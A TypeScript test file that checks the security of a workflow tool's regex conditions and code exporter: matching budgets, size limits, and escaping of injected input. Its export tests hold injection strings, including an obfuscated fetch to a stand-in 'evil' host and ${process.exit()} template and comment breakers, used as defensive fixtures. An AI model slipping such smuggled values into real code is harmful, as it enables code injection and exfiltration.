// Security hardening for matches regex and the condition path around it: each
// case is an attack an audit of this feature tried.

import { describe, expect, it, vi } from "vitest";

vi.mock("server-only", () => ({}));

import { applyBigIntConversion } from "@/lib/bigint-condition-utils";
import { generateWorkflowCode } from "@/lib/workflow/codegen/codegen";
import { generateWorkflowSDKCode } from "@/lib/workflow/codegen/sdk";
import { commentSafe } from "@/lib/workflow/codegen/shared";
import { evaluateConditionExpression } from "@/lib/workflow/executor/executor.workflow";
import {
  editorConditionState,
  expressionToConditionGroup,
} from "@/lib/workflow/nodes/condition/builder-utils";
import {
  compileRegex,
  MAX_RUN_REGEX_WORK,
  RegexBudget,
  RegexBudgetError,
  regexPatternError,
} from "@/lib/workflow/nodes/condition/regex-match";
import { safeEvaluateCondition } from "@/lib/workflow/nodes/condition/safe-eval";
import {
  preValidateConditionExpression,
  validateConditionExpression,
  validateConditionExpressionUI,
  visualConditionLimitError,
} from "@/lib/workflow/nodes/condition/validator";
import type { WorkflowNode } from "@/lib/workflow/store";
import { validateWorkflowActionConfigs } from "@/lib/workflow/validation/action-config";

const FIELD = "{{@n1:Webhook.value}}";

function run(expression: string, value: unknown): boolean {
  return evaluateConditionExpression(
    expression,
    { n1: { label: "Webhook", data: { value } } },
    new Map([["n1", {}]]),
    { n1: { success: true, data: { value } } }
  ).result;
}

describe("regex hardening", () => {
  describe("compile cost", () => {
    it("charges compiles to the budget, so long distinct patterns cannot pile up", () => {
      const calls = Array.from(
        { length: 6 },
        (_, i) => `matchesRegex(${FIELD}, "^${i}${"a".repeat(500)}")`
      ).join(" || ");
      expect(() => run(calls, "b")).toThrow(
        "reached this node's matching limit of 5,000,000 while preparing its patterns. Preparing a pattern costs 2,000 per character plus 400 per step"
      );
    });

    it("remembers a refused pattern instead of compiling it again", () => {
      const heavy = "(?:a{1000})".repeat(46);
      const first = performance.now();
      expect(regexPatternError(heavy)).toContain("too complex");
      const firstMs = performance.now() - first;
      const again = performance.now();
      expect(regexPatternError(heavy)).toContain("too complex");
      expect(performance.now() - again).toBeLessThan(Math.max(5, firstMs / 4));
    });

    it("charges a compile once per run, the same whether or not it is cached", () => {
      const pattern = `^${"q".repeat(400)}`;
      // A cached compile is still charged: 401 x 2,000 for the length plus
      // the compiled steps x 400, more than 900,000.
      compileRegex(pattern, false);
      expect(() =>
        compileRegex(pattern, false, new RegexBudget(900_000))
      ).toThrow(RegexBudgetError);
      // Within one run it is paid once, whichever node budget asks.
      const runBudget = new RegexBudget(1_000_000, { scope: "run" });
      for (let i = 0; i < 3; i++) {
        const node = new RegexBudget(1_000_000, { parent: runBudget });
        expect(() => compileRegex(pattern, false, node)).not.toThrow();
      }
    });

    // A Condition's own budget is for matching, so whether it fits does not
    // depend on which earlier Conditions compiled the same pattern.
    it("charges compiles to the run, not the Condition", () => {
      const pattern = `^${"r".repeat(400)}`;
      const runBudget = new RegexBudget(2_000_000, { scope: "run" });
      const node = new RegexBudget(10, { parent: runBudget });
      expect(() => compileRegex(pattern, false, node)).not.toThrow();
    });

    // About 56,000 to compile once, then 46 steps x 42 characters per test.
    it("lets a For Each test 5,000 addresses against one pattern", () => {
      const runBudget = new RegexBudget(MAX_RUN_REGEX_WORK, { scope: "run" });
      const condition = `matchesRegex(${FIELD}, "^0x[0-9a-fA-F]{40}$")`;
      const value = `0x${"ab".repeat(20)}`;
      const outputs = { n1: { label: "Webhook", data: { value } } };
      const results = { n1: { success: true, data: { value } } };
      const nodes = new Map([["n1", {}]]);
      for (let i = 0; i < 5000; i++) {
        expect(
          evaluateConditionExpression(
            condition,
            outputs,
            nodes,
            results,
            runBudget
          ).result
        ).toBe(true);
      }
    });

    it("charges by compiled steps, so a short expanding pattern is not cheap", () => {
      const budget = new RegexBudget(300_000);
      expect(() => compileRegex("x\\pL{990}", false, budget)).toThrow(
        RegexBudgetError
      );
    });
  });

  describe("run budget", () => {
    it("caps the regex work of all Conditions in one run, loops included", () => {
      const runBudget = new RegexBudget(MAX_RUN_REGEX_WORK, { scope: "run" });
      const text = "a".repeat(4096);
      const call = '!matchesRegex(__v0, "(?i)(?:\\\\w?){450}x")';
      // Each evaluation fits its own 5 million; the run's 10 million stops it
      // after two or three.
      let evaluations = 0;
      expect(() => {
        for (let i = 0; i < 100; i++) {
          safeEvaluateCondition(call, { __v0: text }, runBudget);
          evaluations++;
        }
      }).toThrow("reached the run's matching limit");
      expect(evaluations).toBeGreaterThan(0);
      expect(evaluations).toBeLessThan(4);
    });
  });

  describe("condition size", () => {
    it("refuses a regex condition over 10,000 characters in every check", () => {
      const long = `matchesRegex(${FIELD}, "a") || ${FIELD} === "${"a".repeat(10_000)}"`;
      for (const result of [
        preValidateConditionExpression(long),
        validateConditionExpression(long),
        validateConditionExpressionUI(long),
      ]) {
        expect(result).toEqual({
          valid: false,
          error: expect.stringContaining("the limit is 10,000"),
        });
      }
    });

    // The maintainer's case, made larger: a saved allow-list of 300 address
    // rules with no regex keeps running.
    it("leaves long conditions without matchesRegex running", () => {
      const rule = (i: number): string =>
        `{{@node_${String(i).padStart(16, "0")}:Label.from}} === "0x${String(i).padStart(40, "0")}"`;
      const long = Array.from({ length: 300 }, (_, i) => rule(i)).join(" || ");
      const resolved = Array.from(
        { length: 300 },
        (_, i) => `__v${i} === "0x${String(i).padStart(40, "0")}"`
      ).join(" || ");
      expect(resolved.length).toBeGreaterThan(10_000);
      expect(preValidateConditionExpression(long)).toEqual({ valid: true });
      expect(validateConditionExpressionUI(long)).toEqual({ valid: true });
      expect(validateConditionExpression(resolved)).toEqual({ valid: true });
    });

    // Each shape took seconds at this size before; quadratic would again.
    it("checks a 50,000-character condition in linear time", () => {
      const n = 50_000;
      const timed = (run: () => unknown): number => {
        const started = performance.now();
        run();
        return performance.now() - started;
      };
      for (const text of [
        `${"a".repeat(n)} == 1`,
        `__v0 ==${" ".repeat(n)}1`,
        "a[".repeat(n / 2),
        Array.from({ length: n / 6 }, () => '"a"').join(" || "),
        "1,".repeat(n / 2),
        `__v0.includes(${"1,".repeat(n / 2)}1)`,
      ]) {
        expect(timed(() => validateConditionExpression(text))).toBeLessThan(
          1000
        );
        expect(timed(() => preValidateConditionExpression(text))).toBeLessThan(
          1000
        );
        expect(timed(() => validateConditionExpressionUI(text))).toBeLessThan(
          1000
        );
      }
      for (const text of [
        `__v0${" ".repeat(n)}x`,
        `${"x < ".repeat(n / 4)}\ny`,
      ]) {
        expect(timed(() => editorConditionState(text, undefined))).toBeLessThan(
          1000
        );
      }
    });

    // A line break may sit next to the operator; the operands hold none. The
    // rules rebuild without it, so the editor opens such text as text.
    it("still reads a comparison split across lines", () => {
      for (const condition of [`${FIELD}\n=== 5`, `${FIELD} ===\n5`]) {
        expect(expressionToConditionGroup(condition)?.rules[0]).toMatchObject({
          leftOperand: FIELD,
          operator: "===",
          rightOperand: "5",
        });
        expect(editorConditionState(condition, undefined).initialMode).toBe(
          "expression"
        );
      }
    });

    // The parse never reads across a line break, so such text is not parsed.
    it("opens text with a line break as text, unparsed", () => {
      const rule = `${FIELD} === "a" || `;
      const long = `${rule.repeat(2500)}\n${FIELD} === "b"`;
      const started = performance.now();
      expect(editorConditionState(long, undefined)).toEqual({
        parsedGroup: null,
        initialMode: "expression",
      });
      expect(performance.now() - started).toBeLessThan(50);
      expect(
        editorConditionState(`${FIELD} === "a\nb"`, undefined).initialMode
      ).toBe("expression");
    });

    // Opening a node saves the parsed rules, which then run, so a parse that
    // does not rebuild the text must not become rules.
    it("opens a condition its rules cannot rebuild as text", () => {
      for (const condition of [
        `${FIELD} === 1\n|| ${FIELD} === 2`,
        `${FIELD} +\n1 === 2`,
        `(${FIELD}\n=== 1)`,
      ]) {
        expect(editorConditionState(condition, undefined)).toEqual({
          parsedGroup: null,
          initialMode: "expression",
        });
      }
      expect(
        editorConditionState(`${FIELD} === 1 || ${FIELD} === 2`, undefined)
          .initialMode
      ).toBe("visual");
    });

    // The bracket check reads the content up to the first "]", as before.
    it("still refuses nested brackets", () => {
      for (const [condition, error] of [
        ["__v0[__v1[0]] === 1", 'Invalid bracket content: "[__v1[0]"'],
        ["__v0[[0]] === 1", 'Invalid bracket content: "[[0]"'],
        ["foo__v0[__v1[0]] === 1", 'Cannot index "foo__v0[...]"'],
      ]) {
        expect(validateConditionExpression(condition)).toEqual({
          valid: false,
          error: expect.stringContaining(error),
        });
      }
    });

    it("caps a regex condition at exactly 10,000 characters", () => {
      const sized = (length: number): string => {
        const head = 'matchesRegex(__v0, "a") || __v0 === "';
        return `${head}${"a".repeat(length - head.length - 1)}"`;
      };
      for (const check of [
        preValidateConditionExpression,
        validateConditionExpression,
        validateConditionExpressionUI,
      ]) {
        expect(check(sized(10_000))).toEqual({ valid: true });
        expect(check(sized(10_001)).valid).toBe(false);
      }
      // The editor measures the saved text, spaces included, as the run does.
      expect(validateConditionExpressionUI(`  ${sized(10_000)}  `).valid).toBe(
        false
      );
      // The name only inside quotes is not a regex test.
      const quoted = `__v0 === "matchesRegex(${"a".repeat(10_000)}"`;
      expect(validateConditionExpression(quoted)).toEqual({ valid: true });
      // An unclosed quote is still measured.
      expect(
        validateConditionExpression(
          `matchesRegex(__v0, "a") || "${"a".repeat(10_000)}`
        )
      ).toEqual({
        valid: false,
        error: expect.stringContaining("the limit is 10,000"),
      });
    });

    it("shows the visual limits before a run", () => {
      const rules = (count: number): string =>
        Array.from({ length: count }, () => `matchesRegex(${FIELD}, "a")`).join(
          " || "
        );
      expect(visualConditionLimitError(rules(17), 17)).toBe(
        "A Condition can have at most 16 regex tests. Split them across two Condition nodes"
      );
      const long = `${rules(1)} || ${FIELD} === "${"a".repeat(10_000)}"`;
      expect(visualConditionLimitError(long, 1)).toContain(
        "These rules are too long to run with a regex test"
      );
      expect(visualConditionLimitError(long, 1)).toContain("Split them across");
      expect(
        visualConditionLimitError(`${FIELD} === "${"a".repeat(10_000)}"`, 0)
      ).toBeUndefined();
    });

    it("opens a condition with more regex tests than allowed as text", () => {
      const calls = Array.from(
        { length: 17 },
        () => `matchesRegex(${FIELD}, "a")`
      ).join(" || ");
      expect(editorConditionState(calls, undefined)).toEqual({
        parsedGroup: null,
        initialMode: "expression",
      });
    });
  });

  describe("expression mode", () => {
    // A flags argument is a JavaScript habit; RE2 takes (?i) in the pattern.
    it("says how to ignore case when given a third value", () => {
      expect(
        validateConditionExpressionUI(`matchesRegex(${FIELD}, "^a", "i")`)
      ).toEqual({
        valid: false,
        error: expect.stringContaining("start the pattern with (?i)"),
      });
    });

    it("asks for quotes around a pattern typed without them", () => {
      for (const condition of [
        `matchesRegex(${FIELD}, ^0x)`,
        `matchesRegex(${FIELD}, /^0x/i)`,
      ]) {
        for (const result of [
          preValidateConditionExpression(condition),
          validateConditionExpressionUI(condition),
        ]) {
          expect(result).toEqual({
            valid: false,
            error: expect.stringContaining("Write the regex pattern as one"),
          });
        }
      }
    });

    it("refuses a comma outside call parentheses", () => {
      expect(validateConditionExpressionUI(`${FIELD}, 1`).valid).toBe(false);
      expect(validateConditionExpression("__v0, 1")).toEqual({
        valid: false,
        error: 'Condition contains disallowed syntax: ","',
      });
      expect(validateConditionExpression('__v0.includes("a", 1)')).toEqual({
        valid: true,
      });
    });

    it("refuses notMatchesRegex(...) as a function, before any run", () => {
      const condition = `notMatchesRegex(${FIELD}, "a")`;
      for (const result of [
        preValidateConditionExpression(condition),
        validateConditionExpressionUI(condition),
      ]) {
        expect(result).toEqual({
          valid: false,
          error: expect.stringContaining("write !matchesRegex(...)"),
        });
      }
      expect(
        preValidateConditionExpression(`${FIELD} === "notMatchesRegex(x)"`)
      ).toEqual({ valid: true });
    });

    it("reads no rules from a condition whose quote is never closed", () => {
      expect(editorConditionState(`${FIELD} === "open`, undefined)).toEqual({
        parsedGroup: null,
        initialMode: "expression",
      });
    });
  });

  describe("values", () => {
    it("refuses a value that is undefined, e.g. from a node that did not run", () => {
      for (const expression of [
        'matchesRegex(__v0, "^0x")',
        '!matchesRegex(__v0, "^0x")',
      ]) {
        expect(() =>
          safeEvaluateCondition(expression, { __v0: undefined })
        ).toThrow("got no value");
      }
    });
  });

  describe("large-integer mode", () => {
    it("caps the size of a power result", () => {
      const started = performance.now();
      expect(() =>
        run(
          `${FIELD} === "x" && 9007199254740993 > 1 && 7 ** 30000000 > 1`,
          "x"
        )
      ).toThrow("too large");
      expect(performance.now() - started).toBeLessThan(1000);
      expect(run(`${FIELD} === "x" && 2 ** 64 > 9007199254740993`, "x")).toBe(
        true
      );
    });

    it("raises 0, 1 and -1 to any power", () => {
      for (const [base, power] of [
        [BigInt(1), BigInt(1)],
        [BigInt(0), BigInt(0)],
        [BigInt(-1), BigInt(1)],
      ]) {
        expect(
          safeEvaluateCondition("__v0 ** __v1", {
            __v0: base,
            __v1: BigInt(100_000),
          })
        ).toBe(power);
      }
      expect(() =>
        safeEvaluateCondition("__v0 ** __v1", {
          __v0: BigInt(2),
          __v1: BigInt(100_000),
        })
      ).toThrow("too large");
    });

    it("tests the value as resolved, leading zeros included", () => {
      const data = { balance: "2000000000000000000000", zip: "01234" };
      const evaluate = (condition: string): boolean =>
        evaluateConditionExpression(
          condition,
          { n1: { label: "Webhook", data } },
          new Map([["n1", {}]]),
          { n1: { success: true, data } }
        ).result;
      const big = "{{@n1:Webhook.balance}} > 1000000000000000000000";
      const zip = '"^0\\\\d{4}$"';
      expect(
        evaluate(`${big} && matchesRegex({{@n1:Webhook.zip}}, ${zip})`)
      ).toBe(true);
      expect(
        evaluate(`${big} && !matchesRegex({{@n1:Webhook.zip}}, "^1234$")`)
      ).toBe(true);
    });

    // Typed numbers are numbers there too, so arithmetic works as outside the mode.
    it("computes the tested value as it would outside large-integer mode", () => {
      const data = { balance: "2000000000000000000000", n: "5" };
      expect(
        evaluateConditionExpression(
          '{{@n1:Webhook.balance}} > 1000000000000000000000 && matchesRegex(String({{@n1:Webhook.n}} * 2), "^10$")',
          { n1: { label: "Webhook", data } },
          new Map([["n1", {}]]),
          { n1: { success: true, data } }
        ).result
      ).toBe(true);
    });

    it("leaves a number after a dot, $ or [ alone", () => {
      const { expression } = applyBigIntConversion(
        "__v0.5 === 1 && __v1.$7 > 3 && __v2[0] === 9007199254740993",
        { __v0: "1" }
      );
      expect(expression).toContain("__v0.5 ");
      expect(expression).toContain("__v1.$7 ");
      expect(expression).toContain("__v2[0]");
    });
  });

  describe("Filter Array settings", () => {
    function filterNode(config: Record<string, unknown>): WorkflowNode {
      return {
        id: "f1",
        type: "action",
        position: { x: 0, y: 0 },
        data: {
          label: "Filter",
          type: "action",
          config: { actionType: "data/filter", source: "[]", ...config },
        },
      } as WorkflowNode;
    }

    it("refuses Ignore case or the operator taken from another node", () => {
      for (const [config, text] of [
        [
          { operator: "matchesRegex", value: "^a", ignoreCase: "{{@n1:W.ic}}" },
          "Ignore case does not take a template",
        ],
        // The select check refuses it first; either way it never saves.
        [{ operator: "{{@n1:W.op}}", value: "a" }, "operator"],
      ] as const) {
        const result = validateWorkflowActionConfigs([filterNode(config)]);
        expect(result.valid).toBe(false);
        expect(JSON.stringify(result.issues)).toContain(text);
      }
    });
  });

  describe("code export", () => {
    function exported(condition: string, label = "Check"): string {
      return generateWorkflowSDKCode(
        "wf",
        [
          {
            id: "t",
            type: "trigger",
            position: { x: 0, y: 0 },
            data: { label: "Trigger", type: "trigger", config: {} },
          },
          {
            id: "c",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
              label,
              type: "action",
              config: { actionType: "Condition", condition },
            },
          },
          {
            id: "n",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
              label: "Next",
              type: "action",
              config: { actionType: "HTTP Request" },
            },
          },
        ] as WorkflowNode[],
        [
          { id: "e1", source: "t", target: "c" },
          { id: "e2", source: "c", target: "n" },
        ] as never
      );
    }

    // Built from parts: these are attack payloads, not template mistakes.
    const payload = (n: number): string => `${"$"}{process.exit(${n})}`;

    it("never writes a pattern or value as live template code", () => {
      const code = exported(`matchesRegex(${FIELD}, "${payload(7)}")`);
      expect(code).not.toContain(payload(7));
      // Fails loudly where it is reached, rather than taking the false branch.
      expect(code).toContain(
        'const conditionValue_c = (() => { throw new Error("This condition uses matchesRegex'
      );
      // Inside the condition's template literal, ${ must stay escaped.
      const plain = exported(`String(${FIELD}).includes("${payload(8)}")`);
      const literalLine = plain
        .split("\n")
        .find((line) => line.includes("const conditionValue_c"));
      expect(literalLine).toContain(`\\${payload(8)}`);
    });

    it("keeps a label inside its comment", () => {
      const code = exported(`${FIELD} === 1`, "Lbl\nprocess.exit(9);//");
      expect(code).not.toMatch(/^\s*process\.exit\(9\)/m);
    });

    function workflowCode(condition: string, sourceLabel = "Webhook"): string {
      const nodes = [
        {
          id: "t",
          type: "trigger",
          position: { x: 0, y: 0 },
          data: { label: "Trigger", type: "trigger", config: {} },
        },
        {
          id: "n1",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: sourceLabel,
            type: "action",
            config: { actionType: "HTTP Request" },
          },
        },
        {
          id: "c",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: "Check",
            type: "action",
            config: { actionType: "Condition", condition },
          },
        },
        {
          id: "n",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: "Next",
            type: "action",
            config: { actionType: "HTTP Request" },
          },
        },
      ] as WorkflowNode[];
      const edges = [
        { id: "e0", source: "t", target: "n1" },
        { id: "e1", source: "n1", target: "c" },
        { id: "e2", source: "c", target: "n", sourceHandle: "true" },
      ] as never;
      return generateWorkflowCode(nodes, edges).code;
    }

    // The maintainer's example. A key needing escapes is written without
    // quotes or backslashes, so escaping done later cannot reopen it; the
    // Condition exporter then refuses it, since it is not condition grammar.
    it("writes any field path as data, never as code", () => {
      const injected = `{{@n1:Webhook.a || fetch(atob("aHR0cDovL2V2aWw")) || b}} == 1`;
      // Written as is, a Condition's key is a plain quoted string.
      expect(workflowCode(injected)).toContain(
        'if (webhookResult["a || fetch(atob(\\"aHR0cDovL2V2aWw\\")) || b"] == 1) {'
      );
      // Escaped again later as template text, it is written without quotes.
      const sdk = exported(injected);
      expect(sdk).toContain("?.data?.[String.fromCharCode(");
      expect(sdk).not.toContain("fetch(atob");
      expect(workflowCode("{{@n1:Webhook.my field}} == 1")).toContain(
        'if (webhookResult["my field"] == 1) {'
      );
    });

    // Paths are read the way the run reads them (resolveStrictPath).
    it("writes indexes and odd parts the way the run reads them", () => {
      for (const [path, written] of [
        ["items[0].value", "webhookResult.items[0].value"],
        ["topics.1", "webhookResult[1]".replace("[1]", ".topics[1]")],
        ["codes.007", 'webhookResult.codes["007"]'],
        ["items[007]", "webhookResult.items[7]"],
        ["a..b", "webhookResult.a.b"],
        [" a . b ", "webhookResult.a.b"],
        ["my-list[0]", 'webhookResult["my-list"][0]'],
        ["n.99999999999999999999", 'webhookResult.n["99999999999999999999"]'],
      ] as const) {
        expect(workflowCode(`{{@n1:Webhook.${path}}} == 1`)).toContain(
          `if (${written} == 1) {`
        );
      }
    });

    // A reference inside quotes is part of the text; it must not close them.
    it("keeps a reference inside a quoted string from closing it", () => {
      const inDouble = `"{{@n1:Webhook. + fetch(atob('aHR0cDovL2V2aWw')) + }}" == "x"`;
      const inSingle = `'{{@n1:Webhook. + fetch(atob("aHR0cDovL2V2aWw")) + }}' == "x"`;
      // Closing the double quotes would make a call: refused.
      expect(workflowCode(inDouble)).toContain("if (false /* ERROR:");
      // Inside single quotes the key's double quotes are only text.
      expect(workflowCode(inSingle)).toContain(
        `if ('webhookResult["+ fetch(atob(\\"aHR0cDovL2V2aWw\\")) +"]' == "x") {`
      );
      // The SDK writes the condition as template text; the key stays one
      // string inside its ${...}.
      expect(exported(inDouble)).toContain(
        `\`"\${outputs?.['n1']?.data?.["+ fetch(atob('aHR0cDovL2V2aWw')) +"]}" == "x"\``
      );
      expect(exported(inSingle)).toContain(
        "`'${outputs?.['n1']?.data?.[String.fromCharCode("
      );
    });

    it("exports a regex condition as code that throws where it is reached", () => {
      const nodes = [
        {
          id: "t",
          type: "trigger",
          position: { x: 0, y: 0 },
          data: { label: "Trigger", type: "trigger", config: {} },
        },
        {
          id: "c",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: "Check",
            type: "action",
            config: {
              actionType: "Condition",
              condition: `matchesRegex(${FIELD}, "^0x")`,
            },
          },
        },
        {
          id: "n",
          type: "action",
          position: { x: 0, y: 0 },
          data: {
            label: "Next",
            type: "action",
            config: { actionType: "HTTP Request" },
          },
        },
      ] as WorkflowNode[];
      const edges = [
        { id: "e1", source: "t", target: "c" },
        { id: "e2", source: "c", target: "n", sourceHandle: "true" },
      ] as never;
      const result = generateWorkflowCode(nodes, edges);
      expect(result.code).toContain(
        'if ((() => { throw new Error("This condition uses matchesRegex'
      );
      expect(result.validationErrors).toEqual([
        'Condition node "Check" uses matchesRegex, which exported code does not support',
      ]);
    });

    // Reached only when save validation was skipped (an unknown type).
    it("writes an unknown action type as a string", () => {
      const actionType = 'x", evil: process.exit(1), y: "';
      const code = generateWorkflowCode(
        [
          {
            id: "t",
            type: "trigger",
            position: { x: 0, y: 0 },
            data: { label: "Trigger", type: "trigger", config: {} },
          },
          {
            id: "u",
            type: "action",
            position: { x: 0, y: 0 },
            data: { label: "Odd", type: "action", config: { actionType } },
          },
          {
            id: "n",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
              label: "Next",
              type: "action",
              config: {
                actionType: "HTTP Request",
                endpoint: "{{@u:Odd.x}}",
              },
            },
          },
        ] as WorkflowNode[],
        [
          { id: "e1", source: "t", target: "u" },
          { id: "e2", source: "u", target: "n" },
        ] as never
      ).code;
      expect(code).not.toContain("evil: process.exit(1)");
    });

    // JavaScript reads these differently from the run: an increment, and a
    // leading-zero number that a module refuses.
    it("refuses ++, --, leading-zero numbers and 1.e3 in exported conditions", () => {
      for (const condition of [
        "{{@n1:Webhook.a}} ++ > 0",
        "-- {{@n1:Webhook.a}} > 0",
        "{{@n1:Webhook.a}} == 010",
        "1.e3 === {{@n1:Webhook.a}}",
      ]) {
        expect(workflowCode(condition)).toContain("if (false /* ERROR:");
      }
      expect(workflowCode("{{@n1:Webhook.a}} == 0.5")).toContain(
        "if (webhookResult.a == 0.5) {"
      );
      // $01 is a name, not a number.
      expect(workflowCode("{{@n1:Webhook.a}}.$01 === 1")).toContain(
        "if (webhookResult.a.$01 === 1) {"
      );
      expect(exported("1.e3 == 1")).toContain(
        "condition: false /* not supported"
      );
    });

    it("writes long and odd keys as the run reads them", () => {
      expect(workflowCode("{{@n1:Webhook.n.9007199254740993}} == 1")).toContain(
        'webhookResult.n["9007199254740993"] == 1'
      );
      expect(exported("{{@n1:Webhook.a`b}} == 1")).toContain(
        "?.data?.[String.fromCharCode(97,96,98)]"
      );
    });

    // Condition step input is written as code, so it gets the same check.
    it("writes a Condition step's input only when it is condition grammar", () => {
      expect(exported("1 == 1")).toContain("condition: 1 == 1");
      // JavaScript reads 010 differently from the run.
      expect(exported("1 == 010")).toContain(
        "condition: false /* not supported"
      );
      const code = exported("process.exit(1)");
      expect(code).toContain("condition: false /* not supported");
      expect(code).not.toContain("condition: process.exit");
    });

    it("exports a reference to a node whose label has dots", () => {
      expect(
        workflowCode(
          "{{@n1:Price v1.2 (beta).amount}} > 5",
          "Price v1.2 (beta)"
        )
      ).toContain("if (priceV12BetaResult.amount > 5) {");
    });

    // A token the exporter cannot resolve is written as typed.
    it("refuses a token it cannot resolve, so its text stays out of code", () => {
      for (const condition of [
        '"{{a" + fetch(atob("aHR0cDovL2V2aWw")) + "b}}" == 1',
        '"{{@nope:x" + fetch(atob("aHR0cDovL2V2aWw")) + "y}}" == 1',
        '"{{$nope" + fetch(atob("aHR0cDovL2V2aWw")) + "y}}" == 1',
      ]) {
        const code = workflowCode(condition);
        expect(code).toContain("if (false /* ERROR:");
        expect(code).not.toContain("+ fetch(atob");
      }
      expect(
        exported('"{{a" + fetch(atob("aHR0cDovL2V2aWw")) + "b}}" == 1')
      ).toContain(
        "const conditionValue_c = false; // not supported in exported code"
      );
    });

    it("writes a label into a string literal as data", () => {
      const label = "L'+fetch('evil')+'";
      const code = generateWorkflowSDKCode(
        "wf",
        [
          {
            id: "t",
            type: "trigger",
            position: { x: 0, y: 0 },
            data: { label: "Trigger", type: "trigger", config: {} },
          },
          {
            id: "n",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
              label,
              type: "action",
              config: { actionType: "HTTP Request" },
            },
          },
        ] as WorkflowNode[],
        [{ id: "e1", source: "t", target: "n" }] as never
      );
      expect(code).toContain(`label: ${JSON.stringify(label)}, data:`);
      expect(code).not.toContain(`label: '${label}'`);
    });

    // Labels, descriptions, node ids and action types all go through it.
    it("keeps text inside a // or /* comment", () => {
      for (const breaker of ["\n", "\r", "\u2028", "\u2029"]) {
        expect(commentSafe(`note${breaker}process.exit(6);//`)).toBe(
          "note process.exit(6);//"
        );
      }
      expect(commentSafe("a */ process.exit(6); /* b")).not.toContain("*/");
    });
  });
});
